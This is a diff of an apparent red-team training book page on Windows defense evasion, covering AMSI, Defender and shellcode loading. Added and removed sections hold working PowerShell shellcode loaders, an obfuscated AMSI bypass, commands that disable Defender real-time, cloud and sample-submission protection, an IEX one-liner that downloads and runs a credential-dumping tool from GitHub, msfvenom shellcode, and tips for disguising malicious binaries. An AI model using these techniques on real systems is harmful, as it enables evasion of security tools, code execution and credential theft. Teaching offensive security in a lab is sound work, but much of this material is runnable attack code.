@@ -83,7 +83,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div id="sidebar-scrollbox" class="sidebar-scrollbox">
-                <ol class="chapter"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.</strong> Chapter 1 : Intro </a></li><li><ol class="section"><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.1.</strong> Havoc C2</a></li><li class="expanded "><a href="powershell.html"><strong aria-hidden="true">1.2.</strong> Powershell</a></li><li class="expanded "><a href="amsi.html"><strong aria-hidden="true">1.3.</strong> AMSI</a></li><li class="expanded "><a href="static.html"><strong aria-hidden="true">1.4.</strong> Static Analysis</a></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">1.5.</strong> Metasploit Basics</a></li><li class="expanded "><a href="shellcode.html"><strong aria-hidden="true">1.6.</strong> Shellcode</a></li><li><ol class="section"><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.6.1.</strong> WIN32api and Functions</a></li><li><ol class="section"><li class="expanded "><a href="lab1.1.html"><strong aria-hidden="true">1.6.1.1.</strong> Lab - Payloads</a></li><li class="expanded "><a href="lab_shellcode.html"><strong aria-hidden="true">1.6.1.2.</strong> Lab - Shellcode</a></li><li class="expanded "><a href="lab_basic.html"><strong aria-hidden="true">1.6.1.3.</strong> Lab - Basic Loader</a></li><li class="expanded "><a href="lab_staged.html"><strong aria-hidden="true">1.6.1.4.</strong> Lab - Remote Loader</a></li></ol></li></ol></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.7.</strong> Windows Defender</a></li><li><ol class="section"><li class="expanded "><a href="heuristics.html"><strong aria-hidden="true">1.7.1.</strong> Heuristics</a></li><li class="expanded "><a href="uac.html"><strong aria-hidden="true">1.7.2.</strong> UAC</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">1.7.3.</strong> Hooks</a></li><li class="expanded "><a href="etw.html"><strong aria-hidden="true">1.7.4.</strong> ETW</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">1.7.5.</strong> Syscalls</a></li><li class="expanded "><a href=".kernelcallbacks.html"><strong aria-hidden="true">1.7.6.</strong> Kernel Callbacks</a></li><li class="expanded "><a href="edr.html"><strong aria-hidden="true">1.7.7.</strong> EDR Stuff</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.8.</strong> Evasion</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.8.1.</strong> Forensics - Litterbox</a></li></ol></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">2.</strong> Chapter Extra </a></li></ol>
+                <ol class="chapter"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.</strong> Chapter 1 : Intro </a></li><li><ol class="section"><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.1.</strong> Havoc C2</a></li><li class="expanded "><a href="amsi.html"><strong aria-hidden="true">1.2.</strong> AMSI &amp; CLR</a></li><li><ol class="section"><li class="expanded "><a href="lab_powershell.html"><strong aria-hidden="true">1.2.1.</strong> Lab - Powershell</a></li></ol></li><li class="expanded "><a href="static.html"><strong aria-hidden="true">1.3.</strong> Static Analysis</a></li><li><ol class="section"><li class="expanded "><a href="lab_havoc_dotnet.html"><strong aria-hidden="true">1.3.1.</strong> Lab - Havoc dotnet execute</a></li></ol></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">1.4.</strong> Metasploit Basics</a></li><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.5.</strong> WIN32api and Functions</a></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.6.</strong> Windows Defender</a></li><li><ol class="section"><li class="expanded "><a href="heuristics.html"><strong aria-hidden="true">1.6.1.</strong> Heuristics</a></li><li class="expanded "><a href="uac.html"><strong aria-hidden="true">1.6.2.</strong> UAC</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">1.6.3.</strong> Hooks</a></li><li class="expanded "><a href="etw.html"><strong aria-hidden="true">1.6.4.</strong> ETW</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">1.6.5.</strong> Syscalls</a></li><li class="expanded "><a href=".kernelcallbacks.html"><strong aria-hidden="true">1.6.6.</strong> Kernel Callbacks</a></li><li class="expanded "><a href="edr.html"><strong aria-hidden="true">1.6.7.</strong> EDR Stuff</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.7.</strong> Evasion</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.7.1.</strong> Forensics - Litterbox</a></li></ol></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">2.</strong> Chapter Extra </a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -388,57 +388,9 @@ execute</p>
 <blockquote>
 <p>Explain sacrificial process - advatages/disadvantages (command line logging, stability, patching, not touching other processes)</p>
 </blockquote>
-<h1><a class="header" href="#powershell" id="powershell">Powershell</a></h1>
-<p>AMSI
-Invoke-Obfuscastion
-powershell shellcode loader (without amsi bypass)</p>
-<pre><code class="language-powershell">$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode
-
-$code = @&quot;
-using System;
-using System.Runtime.InteropServices;
-public class Win32 {
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-    [DllImport(&quot;msvcrt.dll&quot;, SetLastError=true)] public static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);
-}
-&quot;@
-
-Add-Type -TypeDefinition $code
-
-# Allocate memory
-$mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
-
-# Copy shellcode to memory
-[Win32]::memcpy($mem, $shellcode, $shellcode.Length)
-
-# Create thread to execute shellcode
-$thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-
-# Wait for thread to exit (optional)
-[System.Runtime.InteropServices.Marshal]::WaitForSingleObject($thread, 0xFFFFFFFF)
-</code></pre>
-<p>Shorter version:</p>
-<pre><code class="language-powershell">$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode
-
-# Allocate memory
-$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
-
-# Copy shellcode to memory
-[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)
-
-# Create thread to execute shellcode
-$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Threading.ThreadStart])
-
-# Start the thread
-$thread.Invoke()
-
-# Wait for thread to exit (optional)
-[System.Threading.Thread]::Sleep(-1)
-</code></pre>
 <h1><a class="header" href="#amsi-anti-malware-scanning-interface" id="amsi-anti-malware-scanning-interface">AMSI (Anti-Malware Scanning Interface)</a></h1>
 <blockquote>
-<p>WARNING : Amsi loads into powershell, with dotner amsi integrates with the clr which loads AMSI on demand.</p>
+<p>WARNING : Amsi.dll is loaded into every powershell.exe process, but when running dotnet (csharp) binaries, amsi integrates directly with the clr which loads AMSI on demand. Amsi Bypasses that work in powershell don't necessariy work for the CLR integration.</p>
 </blockquote>
 <p>AmsiScanBuffer
 AmsiScanString
@@ -511,9 +463,6 @@ $dotnet = [System.Reflection.Assembly]::Load(&quot;mscorlib&quot;)
 $dotnet.GetName().Version
 </code></pre>
 <p><img src="./images/dotnetversion.jpg" alt="image" /></p>
-<p>Check Powershell installed on the system:</p>
-<pre><code class="language-yaml">(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngine -Name PowerShellVersion).PowerShellVersion
-</code></pre>
 <h2><a class="header" href="#amsitest" id="amsitest">AMSITEST</a></h2>
 <pre><code class="language-yaml">It '&quot;Antimalware Scan Interface&quot; is working' {
     # AMSI test string 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
@@ -526,12 +475,9 @@ $dotnet.GetName().Version
 }
 </code></pre>
 <h2><a class="header" href="#amsibypass" id="amsibypass">AMSIBYPASS</a></h2>
-<p>Works on 1803 and before</p>
 <blockquote>
 <p>This bypass does not require administrator rights!!!</p>
 </blockquote>
-<pre><code class="language-yaml">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic, Static').SetValue($null,$true)
-</code></pre>
 <p>Works on 1903, 1909 and before</p>
 <pre><code class="language-yaml">sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  &quot;{1}{0}&quot;-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( &quot;1Q2U&quot;  +&quot;zX&quot;  )  -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f'amsi','d','InitFaile'  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f 'Stat','i','NonPubli','c','c, ' )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
 </code></pre>
@@ -645,7 +591,136 @@ public class AmsiBypass
 Babel</p>
 <hr />
 <p>https://github.com/pracsec/AmsiScanner/tree/main/src</p>
+<h1><a class="header" href="#powershell" id="powershell">Powershell</a></h1>
+<blockquote>
+<p><em><strong>IMPORTANT</strong></em> : Please do not send submit samples to <code>Virus Total</code> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
+Make sure at all times that sample submussion in Microsoft Defender is turned off, and if for some reason you get prompted to submit a sample, deny the request.</p>
+</blockquote>
+<p>Make exceptions in Windows Defender:</p>
+<pre><code class="language-bash">[+] C:\Downloads -&gt; to make it easier to download our tools with out AV Detection
+[+] C:\THEV -&gt; our training course
+[+] C:\Temp -&gt; Used by GoCheck
+[+] C:\SysinternalsSuite
+</code></pre>
+<p>We can do this using powershell:</p>
+<pre><code class="language-powershell">Add-MpPreference -ExclusionPath &quot;C:\SysinternalsSuite&quot;
+(Get-MpPreference).ExclusionPath
+</code></pre>
+<p>We can check some general Defender settings in powershell:</p>
+<pre><code class="language-powershell">Get-MpComputerStatus
+Get-MpThreat
+</code></pre>
+<p>Turning off various modules of Microsoft Defender using powershell:</p>
+<h3><a class="header" href="#real-time-protection" id="real-time-protection">Real-Time Protection</a></h3>
+<p><code>Real-Time Protection</code>: This is a feature of Microsoft Defender that continuously monitors your system for threats (e.g., malware, viruses) in real-time. It scans files, apps, and processes as they are accessed or executed. Setting DisableRealtimeMonitoring to $true turns off real-time protection, meaning files and processes are no longer automatically scanned.</p>
+<p>This does not disable Microsoft Defender entirely—it only disables real-time scanning. Other features like <em><strong>scheduled scans and manual scans will still work</strong></em>.</p>
+<pre><code class="language-powershell">Set-MpPreference -DisableRealtimeMonitoring $true
+</code></pre>
+<h3><a class="header" href="#cloud-delivered-protection" id="cloud-delivered-protection">Cloud-Delivered Protection</a></h3>
+<p>The <code>MAPSReporting</code> setting controls the Microsoft Active Protection Service (MAPS), also referred to as <code>Cloud-Delivered Protection</code>. Setting it to Disabled stops your system from sending information about threats to Microsoft and prevents it from receiving <code>cloud-based threat intelligence</code> in real time.</p>
+<pre><code class="language-powershell">Set-MpPreference -MAPSReporting Disable
+</code></pre>
+<h3><a class="header" href="#automatic-sample-submission" id="automatic-sample-submission">Automatic Sample Submission</a></h3>
+<p><code>SubmitSamplesConsent</code> controls how Microsoft Defender submits samples of suspicious or potentially harmful files to Microsoft for analysis. These samples help improve Defender’s detection and protection capabilities.</p>
+<p><code>NeverSend</code>: This value tells Microsoft Defender to disable all sample submissions. No files will be sent to Microsoft for further analysis, even if they’re flagged as suspicious.</p>
+<pre><code class="language-powershell">Set-MpPreference -SubmitSamplesConsent NeverSend
+</code></pre>
+<table><thead><tr><th>Consent Level</th><th>Description</th></tr></thead><tbody>
+<tr><td>0</td><td>Always Prompt</td></tr>
+<tr><td>1</td><td>Send Safe Samples Automatically</td></tr>
+<tr><td>2</td><td>Never Send</td></tr>
+</tbody></table>
+<h1><a class="header" href="#lab---evading-amsi" id="lab---evading-amsi">LAB - Evading AMSI</a></h1>
+<blockquote>
+<p>For this lab we will enable <code>Microsoft Defender</code> - in order to demonstrate how AMSI works, and how to bypass it.</p>
+</blockquote>
+<p>Check if Defender is turned on by either using the powershell commands, or the GUI:</p>
+<pre><code class="language-powershell">[PSCustomObject]@{
+    &quot;Real-Time Protection&quot;        = (Get-MpComputerStatus).RealTimeProtectionEnabled
+    &quot;Cloud-Delivered Protection&quot;  = if ((Get-MpPreference).MAPSReporting -eq 2) { $true } else { $false }
+    &quot;Automatic Sample Submission&quot; = if ((Get-MpPreference).SubmitSamplesConsent -eq 1) { $true } else { $false }
+} | Format-Table -AutoSize
+</code></pre>
+<p>The output should be like this :</p>
+<p><img src="./images/ps_defsettings.jpg" alt="image" /></p>
+<p>Let's open a powershell terminal and run SharpKatz from memory with IEX (Invoke Expression)</p>
+<pre><code class="language-Powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/crimsoncore/Invoke-SharpKatz/refs/heads/main/Invoke-SharpKatz.ps1&quot;);Invoke-SharpKatz
+</code></pre>
+<p>We'll see the script won't execute since AMSI has scanned it and determined it as malicious:</p>
+<p><img src="./images/ps_invokesharkpkatzblocked.jpg" alt="image" /></p>
+<p>AMSI
+Invoke-Obfuscastion
+powershell shellcode loader (without amsi bypass)</p>
+<pre><code class="language-powershell">$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode
+
+$code = @&quot;
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport(&quot;msvcrt.dll&quot;, SetLastError=true)] public static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);
+}
+&quot;@
+
+Add-Type -TypeDefinition $code
+
+# Allocate memory
+$mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
+
+# Copy shellcode to memory
+[Win32]::memcpy($mem, $shellcode, $shellcode.Length)
+
+# Create thread to execute shellcode
+$thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+
+# Wait for thread to exit (optional)
+[System.Runtime.InteropServices.Marshal]::WaitForSingleObject($thread, 0xFFFFFFFF)
+</code></pre>
+<p>Shorter version:</p>
+<pre><code class="language-powershell">$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode
+
+# Allocate memory
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
+
+# Copy shellcode to memory
+[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)
+
+# Create thread to execute shellcode
+$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Threading.ThreadStart])
+
+# Start the thread
+$thread.Invoke()
+
+# Wait for thread to exit (optional)
+[System.Threading.Thread]::Sleep(-1)
+</code></pre>
 <h1><a class="header" href="#static-analysis" id="static-analysis">Static Analysis</a></h1>
+<blockquote>
+<p>Visual Studio 2022 Components:</p>
+</blockquote>
+<p><img src="./images/vs_sharpkatz.jpg" alt="Screenshot" /></p>
+<blockquote>
+<p>SysinternalsSuite (<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite</a>)</p>
+<p>GoCheck (<a href="https://github.com/gatariee/gocheck/releases/tag/v1.5.0">https://github.com/gatariee/gocheck/releases/tag/v1.5.0</a>)
+Move GoCheck to C:\Sysinternals
+Add c:\SysinternalsSuite to PATH</p>
+<p>Install Python3x ?
+Install Yara ? (<a href="https://github.com/VirusTotal/yara/releases/download/v4.5.2/yara-v4.5.2-2326-win64.zip">https://github.com/VirusTotal/yara/releases/download/v4.5.2/yara-v4.5.2-2326-win64.zip</a>)
+Install Yara and Hex editor plugin <em>VS CODE</em>?</p>
+</blockquote>
+<pre><code class="language-code">For Yara Download and Install Visual C++ Redistributable:
+Go to the official Microsoft download page for the Visual C++ Redistributable
+(,https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170&gt;)
+Download and install the Visual C++ Redistributable for Visual Studio 2015, 2017, 2019, and 2022:
+Visual C++ Redistributable x64
+</code></pre>
+<p>How to make a new project:</p>
+<pre><code class="language-csharp">dotnet new console -n MyApp
+cd MyApp
+dotnet build
+dotnet run
+</code></pre>
 <p>Let's take a common attack tool &quot;Rubeus&quot;, compile it and see what Defender thinks of it.</p>
 <p><a href="https://www.youtube.com/watch?v=sP2XH8YI20c&amp;t=1042s">https://www.youtube.com/watch?v=sP2XH8YI20c&amp;t=1042s</a></p>
 <p><a href="https://github.com/GhostPack/Rubeus.git">https://github.com/GhostPack/Rubeus.git</a></p>
@@ -747,6 +822,7 @@ cd MyApp
 dotnet build
 dotnet run
 </code></pre>
+<h1><a class="header" href="#lab---havoc-dotnet-execute" id="lab---havoc-dotnet-execute">Lab - Havoc dotnet execute</a></h1>
 <h1><a class="header" href="#chapter-11---metasploit-basics" id="chapter-11---metasploit-basics">Chapter 1.1 - Metasploit Basics</a></h1>
 <p>Log on to your Unbuntu VM with <strong>admin/admin</strong>, open a terminal prompt and start the metasploit console:</p>
 <pre><code class="language-code">msfconsole
@@ -796,279 +872,6 @@ cp evil.pdf /temp
 <p><img src="./images/8_adobe_1.jpg" alt="Screenshot" /></p>
 <p><img src="./images/9_adobe_2.jpg" alt="Screenshot" /></p>
 <p><img src="./images/10_session.jpg" alt="Screenshot" /></p>
-<h1><a class="header" href="#shellcode" id="shellcode">Shellcode</a></h1>
-<h2><a class="header" href="#--what-is-position-independent-code-shellcode" id="--what-is-position-independent-code-shellcode">[-] What is Position Independent Code (Shellcode)?</a></h2>
-<p>Position Independent Code is code that is designed to execute regardless of where it resides in memory. This is in contrast to most programs, which might need to be loaded at a specific address to function correctly. Shellcode is a type of PIC, often written for exploits and payloads in hacking.</p>
-<p>The term “Shellcode” originally referred to code that, when executed, would spawn a command shell — hence the name. However, today, it generally refers to any payload used for exploitation.</p>
-<h3><a class="header" href="#--uses-of-shellcode" id="--uses-of-shellcode">[-] Uses of Shellcode:</a></h3>
-<p><em><strong>Exploitation</strong></em>: The primary use of shellcode is to exploit vulnerabilities in software, where the attacker can inject and execute their code.
-<em><strong>Payloads</strong></em>: Once a vulnerability is exploited, shellcode can be used to deliver payloads, which can range from spawning a reverse shell to injecting ransomware or establishing persistence.
-<em><strong>Bypassing Restrictions</strong></em>: Shellcode can be crafted to bypass security mechanisms, making detection and mitigation difficult.</p>
-<h3><a class="header" href="#--shellcode-vs-compiled-code-vs-interpreted-code" id="--shellcode-vs-compiled-code-vs-interpreted-code">[-] Shellcode vs. Compiled Code vs. Interpreted Code:</a></h3>
-<p><em><strong>Shellcode</strong></em>: As mentioned, shellcode is position-independent, designed to run from any location in memory. It doesn’t rely on external libraries or functions and should be small and efficient to work within the constraints of an exploit.</p>
-<p><em><strong>Compiled Code</strong></em>: This is code written in languages like C or C++ that is then compiled into machine code by a compiler. The result is a binary executable that the system can run. Unlike shellcode, compiled programs often rely on fixed memory addresses and external libraries.</p>
-<p><em><strong>Interpreted Code</strong></em>: This is code written in languages like Python, Ruby, or JavaScript that is executed line-by-line by an interpreter. It’s not converted into machine code; instead, the interpreter reads and executes it directly. This makes it generally slower than compiled code, but it’s more flexible and platform-independent.</p>
-<p>PE-File vs Shellcode</p>
-<pre><code class="language-bash">msfvenom -a x64 --platform windows -p windows/x64/exec CMD=calc.exe -f c                                            
-No encoder specified, outputting raw payload
-Payload size: 276 bytes
-Final size of c file: 1188 bytes
-unsigned char buf[] = 
-&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;
-&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;
-&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;
-&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;
-&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;
-&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;
-&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;
-&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;
-&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;
-&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;
-&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;
-&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;
-&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;
-&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;
-&quot;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;
-&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&quot;
-&quot;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&quot;
-&quot;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&quot;
-&quot;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&quot;
-&quot;\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;;
-</code></pre>
-<h1><a class="header" href="#using-donut-to-convert-a-pe-to-shellcode" id="using-donut-to-convert-a-pe-to-shellcode">USing DONUT to convert a PE to Shellcode</a></h1>
-<pre><code class="language-powershell">donut.exe -e 1 -a x64 -o shellcode.donut -f 3 -i calcloader.exe -z 1 -b 1 -k 2
-</code></pre>
-<p>In a Portable Executable (PE) file, the <code>unsigned char shellcode[]</code> array is typically stored in the <code>.data</code> section. This section is used for storing initialized global and static variables. The <code>.data</code> section is marked as readable and writable.</p>
-<p>Here's a brief overview of the relevant sections in a PE file:</p>
-<ul>
-<li><strong>.text</strong>: Contains the executable code.</li>
-<li><strong>.data</strong>: Contains initialized global and static variables.</li>
-<li><strong>.bss</strong>: Contains uninitialized global and static variables.</li>
-<li><strong>.rdata</strong>: Contains read-only data, such as string literals and constants.</li>
-</ul>
-<p>Since <code>shellcode</code> is an initialized global variable, it will be placed in the <code>.data</code> section of the PE file.</p>
-<p>To summarize, the <code>unsigned char shellcode[]</code> array in your code will be stored in the <code>.data</code> section of the PE file.</p>
-<p>Let's open CFF Explorer and dump the <code>data section</code>.</p>
-<p><img src="./images/cff_datasection.jpg" alt="image" /></p>
-<p>And open that file in Hexdump:</p>
-<p><img src="./images/hexdump_shell.jpg" alt="image" /></p>
-<p>Let's have a look, lets open powershell and run our loader.</p>
-<p><img src="./images/powershell_memloc.jpg" alt="image" /></p>
-<p>Then attach <code>x64dbg</code> to the localloader.exe and check for those two memory locations:</p>
-<p><img src="./images/xdbg_mem.jpg" alt="image" /></p>
-<p><img src="./images/xdbg_string.jpg" alt="image" /></p>
-<p><img src="./images/procmon_dlls.jpg" alt="image" /></p>
-<p><img src="./images/procmon_rwx.jpg" alt="image" /></p>
-<h2><a class="header" href="#img-srcimagesprocmon_shellcodejpg-altimage-" id="img-srcimagesprocmon_shellcodejpg-altimage-"><img src="./images/procmon_shellcode.jpg" alt="image" /></a></h2>
-<pre><code>**What is AMSI/Dotnet (managed/unmanaged code)**
-    The .NET Framework provides the Assembly.Load method which allows loading Common Object 
-    File Format (COFF) images like such as DLL’s and EXE’s. Assembly.Load can be supplied 
-    with a file path to load a DLL from disk, or with a byte array to load directly in memory.
-
-Threatcheck/AMSI Trigger
-
-ClamAV
-    dotpeek/hexdump --canonical
-    strings -n 5
-</code></pre>
-<p>Shelcode formats (shellcode formatter etc)</p>
-<blockquote>
-<p>OPSEC HINT: Make sure your binaries loog legit, add metadata and and icon to the file!</p>
-</blockquote>
-<p>On Windows (requires SDK):
-<a href="https://dotnet.microsoft.com/en-us/">https://dotnet.microsoft.com/en-us/</a></p>
-<h2><a class="header" href="#cscexe-csharpdotnet" id="cscexe-csharpdotnet"><em><strong>csc.exe (CSharp/dotnet)</strong></em></a></h2>
-<pre><code class="language-code">c:\windows\Microsoft.NET\Framework\v3.5\bin\csc.exe /t:exe /out:loader.exe loader.cs
-csc.exe /t:exe /out:$utilName /unsafe $katzPath
-</code></pre>
-<pre><code class="language-csharp">// AssemblyInfo.cs
-[assembly: AssemblyTitle(&quot;YourProductName&quot;)]
-[assembly: AssemblyDescription(&quot;Some description&quot;)]
-[assembly: AssemblyConfiguration(&quot;&quot;)]
-[assembly: AssemblyCompany(&quot;YourCompanyName&quot;)]
-[assembly: AssemblyProduct(&quot;YourProductName&quot;)]
-[assembly: AssemblyCopyright(&quot;© YourCompanyName&quot;)]
-[assembly: AssemblyTrademark(&quot;&quot;)]
-[assembly: AssemblyCulture(&quot;&quot;)]
-[assembly: AssemblyVersion(&quot;1.0.0.0&quot;)]
-[assembly: AssemblyFileVersion(&quot;1.0.0.0&quot;)]
-</code></pre>
-<pre><code class="language-powershell">csc -out:evil.exe -optimize- -win32icon:app.ico Program.cs AssemblyInfo.cs
-</code></pre>
-<p>You can extract metadata from any binary with this simple program.</p>
-<pre><code class="language-powershell">dotnet new console -n AssemblyInfoExtractor
-cd AssemblyInfoExtractor
-</code></pre>
-<p>Create a &quot;Program.cs&quot; file here</p>
-<pre><code class="language-csharp">using System;
-using System.Reflection;
-
-namespace AssemblyInfoExtractor
-{
-    class Program
-    {
-        static void Main(string[] args)
-        {
-            if (args.Length == 0)
-            {
-                Console.WriteLine(&quot;Please provide the path to the assembly.&quot;);
-                return;
-            }
-
-            string assemblyPath = args[0];
-            try
-            {
-                var assembly = Assembly.LoadFile(assemblyPath);
-                var assemblyName = assembly.GetName();
-
-                Console.WriteLine($&quot;Assembly Full Name: {assemblyName.FullName}&quot;);
-                Console.WriteLine($&quot;Version: {assemblyName.Version}&quot;);
-
-                var attributes = assembly.GetCustomAttributesData();
-                foreach (var attr in attributes)
-                {
-                    if (attr.AttributeType == typeof(AssemblyCompanyAttribute))
-                    {
-                        Console.WriteLine($&quot;Company: {attr.ConstructorArguments[0].Value}&quot;);
-                    }
-                    if (attr.AttributeType == typeof(AssemblyProductAttribute))
-                    {
-                        Console.WriteLine($&quot;Product: {attr.ConstructorArguments[0].Value}&quot;);
-                    }
-                    if (attr.AttributeType == typeof(AssemblyCopyrightAttribute))
-                    {
-                        Console.WriteLine($&quot;Copyright: {attr.ConstructorArguments[0].Value}&quot;);
-                    }
-                    if (attr.AttributeType == typeof(AssemblyTitleAttribute))
-                    {
-                        Console.WriteLine($&quot;Title: {attr.ConstructorArguments[0].Value}&quot;);
-                    }
-                    if (attr.AttributeType == typeof(AssemblyDescriptionAttribute))
-                    {
-                        Console.WriteLine($&quot;Description: {attr.ConstructorArguments[0].Value}&quot;);
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($&quot;Error: {ex.Message}&quot;);
-            }
-        }
-    }
-}
-</code></pre>
-<pre><code class="language-powershell">dotnet build
-dotnet run --project C:\Temp\AssemblyInfoExtractor\AssemblyInfoExtractor.csproj C:\Temp\LocalLoader.exe
-</code></pre>
-<p>or run the exe:</p>
-<pre><code class="language-powershell">C:\Temp\AssemblyInfoExtractor\bin\Debug\net9.0&gt;dir
- Volume in drive C is Windows
- Volume Serial Number is 368D-BFAA
-
- Directory of C:\Temp\AssemblyInfoExtractor\bin\Debug\net9.0
-
-02/21/2025  04:35 PM    &lt;DIR&gt;          .
-02/21/2025  04:35 PM    &lt;DIR&gt;          ..
-02/21/2025  04:31 PM               455 AssemblyInfoExtractor.deps.json
-02/21/2025  04:35 PM             6,656 AssemblyInfoExtractor.dll
-02/21/2025  04:35 PM           145,408 AssemblyInfoExtractor.exe
-02/21/2025  04:35 PM            11,080 AssemblyInfoExtractor.pdb
-02/21/2025  04:31 PM               268 AssemblyInfoExtractor.runtimeconfig.json
-               5 File(s)        163,867 bytes
-               2 Dir(s)   2,280,939,520 bytes free
-
-C:\Temp\AssemblyInfoExtractor\bin\Debug\net9.0&gt;AssemblyInfoExtractor.exe C:\Temp\LocalLoader.exe
-Assembly Full Name: LocalLoader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
-Version: 1.0.0.0
-Title: LocalLoader
-Description:
-Company:
